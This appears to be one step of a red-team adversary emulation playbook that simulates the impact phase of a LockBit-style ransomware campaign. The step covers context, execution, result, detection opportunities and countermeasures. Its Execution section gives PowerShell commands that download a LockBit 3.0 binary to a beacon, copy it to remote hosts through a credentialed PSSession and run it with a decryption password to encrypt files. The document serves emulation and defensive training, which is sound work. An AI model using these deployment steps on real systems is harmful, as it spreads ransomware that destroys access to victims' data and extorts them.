
# Step 6: Data Encrypted for Impact

**Objective**: Encrypt and deny access to critical systems to simulate a ransomware campaign with financial and operational impact.

---

## Context

- This step mimics the behavior of cybercriminals installing ransomware, encrypting critical systems.
- The Red Team still has beacon access to the environment.
- Previous actions (HVT enumeration, credential harvesting, and data exfiltration) have already been completed.
- Red Team maintains active beacon access to endpoints in the HR, FIN, ENG, and RND subnets.
This step simulates the final impact phase of a LockBit-style ransomware campaign.

---

## Execution

1. **Add Lockbit 3.0 to beacon**
```powershell=
download LB3_pass.exe C:\Windows\Temp\LB3_pass.exe
```
2. **Add Lockbit 3.0 to targets**  
```powershell=
# Create a new PSSession to the remote computer
# Replace RemoteComputerName with hostname or IP
$session = New-PSSession -ComputerName "RemoteComputerName" -Credential (Get-Credential)

# Copy the file from local to remote
Copy-Item -Path "C:\Windows\Temp\LB3_pass.exe" -Destination "C:\Windows\Temp\LB3_pass.exe" -ToSession $session

# Remove the PSSession
Remove-PSSession $session

```
3. **Run Lockbit 3.0**
```powershell
Invoke-Command -ComputerName "RemoteComputerName" -ScriptBlock { cd C:\Windows\Temp\; .\LB3_pass.exe -path C:\Users\Public -pass adedcf9741dacd1d2e9b819ff9abd028 }
```


---

## Result

- The data on the organization’s mission critical systems is encrypted
- Simulates final stage of a LockBit-style operation
- Request ransom money, and infects ecosystem with malware

---

## Detection Opportunities

- File name changes
- Outbound network traffic identifies ransomware
- Blue users can no longer access their machines 

---

## Defensive Countermeasures
- Backup and recovery methods to restore data
- Restrict execution to specified protected libraries
- File activity monitoring and ransomware protection
